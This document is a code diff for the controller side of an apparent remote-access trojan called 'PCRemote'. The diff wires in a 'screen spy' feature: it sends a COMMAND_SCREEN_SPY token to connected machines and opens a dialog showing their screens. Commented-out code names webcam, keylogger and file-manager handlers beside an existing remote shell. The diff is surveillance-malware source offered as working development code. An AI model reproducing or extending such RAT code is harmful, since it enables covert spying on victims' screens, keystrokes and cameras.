@@ -10,6 +10,7 @@
 #include "..\common\macros.h"
 #include "ShellDlg.h"
 #include "SystemDlg.h"
+#include "ScreenSpyDlg.h"
 
 #ifdef _DEBUG
 #define new DEBUG_NEW
@@ -130,7 +131,7 @@ BEGIN_MESSAGE_MAP(CPCRemoteDlg, CDialogEx)
 	ON_MESSAGE(WM_ADDTOLIST, OnAddToList)
 	ON_MESSAGE(WM_OPENSHELLDIALOG, OnOpenShellDialog)
 	ON_MESSAGE(WM_OPENPSLISTDIALOG, OnOpenSystemDialog)
-
+	ON_MESSAGE(WM_OPENSCREENSPYDIALOG, OnOpenScreenSpyDialog)
 
 	ON_COMMAND(IDM_NOTIFY_CLOSE, &CPCRemoteDlg::OnNotifyClose)
 	ON_COMMAND(IDM_NOTIFY_SHOW, &CPCRemoteDlg::OnNotifyShow)
@@ -179,9 +180,6 @@ void CPCRemoteDlg::ProcessReceiveComplete(ClientContext *pContext)
 		/*case FILEMANAGER_DLG:
 			((CFileManagerDlg *)dlg)->OnReceiveComplete();
 			break;
-		case SCREENSPY_DLG:
-			((CScreenSpyDlg *)dlg)->OnReceiveComplete();
-			break;
 		case WEBCAM_DLG:
 			((CWebCamDlg *)dlg)->OnReceiveComplete();
 			break;
@@ -191,6 +189,9 @@ void CPCRemoteDlg::ProcessReceiveComplete(ClientContext *pContext)
 		case KEYBOARD_DLG:
 			((CKeyBoardDlg *)dlg)->OnReceiveComplete();
 			break;*/
+		case SCREENSPY_DLG:
+			((CScreenSpyDlg *)dlg)->OnReceiveComplete();
+			break;
 		case SYSTEM_DLG:
 			((CSystemDlg *)dlg)->OnReceiveComplete();
 			break;
@@ -238,10 +239,6 @@ void CPCRemoteDlg::ProcessReceiveComplete(ClientContext *pContext)
 		// 指接调用public函数非模态对话框会失去反应， 不知道怎么回事,太菜
 		g_pConnectView->PostMessage(WM_OPENMANAGERDIALOG, 0, (LPARAM)pContext);
 		break;
-	case TOKEN_BITMAPINFO: //
-		// 指接调用public函数非模态对话框会失去反应， 不知道怎么回事
-		g_pConnectView->PostMessage(WM_OPENSCREENSPYDIALOG, 0, (LPARAM)pContext);
-		break;
 	case TOKEN_WEBCAM_BITMAPINFO: // 摄像头
 		g_pConnectView->PostMessage(WM_OPENWEBCAMDIALOG, 0, (LPARAM)pContext);
 		break;
@@ -251,6 +248,10 @@ void CPCRemoteDlg::ProcessReceiveComplete(ClientContext *pContext)
 	case TOKEN_KEYBOARD_START:
 		g_pConnectView->PostMessage(WM_OPENKEYBOARDDIALOG, 0, (LPARAM)pContext);
 		break;*/
+	case TOKEN_BITMAPINFO: //
+		// 指接调用public函数非模态对话框会失去反应， 不知道怎么回事
+		g_pPCRemoteDlg->PostMessage(WM_OPENSCREENSPYDIALOG, 0, (LPARAM)pContext);
+		break;
 	case TOKEN_PSLIST:
 		g_pPCRemoteDlg->PostMessage(WM_OPENPSLISTDIALOG, 0, (LPARAM)pContext);
 		break;
@@ -639,9 +640,24 @@ LRESULT CPCRemoteDlg::OnOpenShellDialog(WPARAM wParam, LPARAM lParam)
 void CPCRemoteDlg::OnOnlineDesktop()
 {
 	// TODO: 在此添加命令处理程序代码
-	MessageBox("桌面管理");
+	//MessageBox("桌面管理");
+	BYTE bToken = COMMAND_SCREEN_SPY;
+	SendSelectCommand(&bToken, sizeof(BYTE));
 }
 
+LRESULT CPCRemoteDlg::OnOpenScreenSpyDialog(WPARAM wParam, LPARAM lParam)
+{
+	ClientContext *pContext = (ClientContext *)lParam;
+
+	CScreenSpyDlg	*dlg = new CScreenSpyDlg(this, m_iocpServer, pContext);
+	// 设置父窗口为卓面
+	dlg->Create(IDD_SCREENSPY, GetDesktopWindow());
+	dlg->ShowWindow(SW_SHOW);
+
+	pContext->m_Dialog[0] = SCREENSPY_DLG;
+	pContext->m_Dialog[1] = (int)dlg;
+	return 0;
+}
 
 void CPCRemoteDlg::OnOnlineFile()
 {
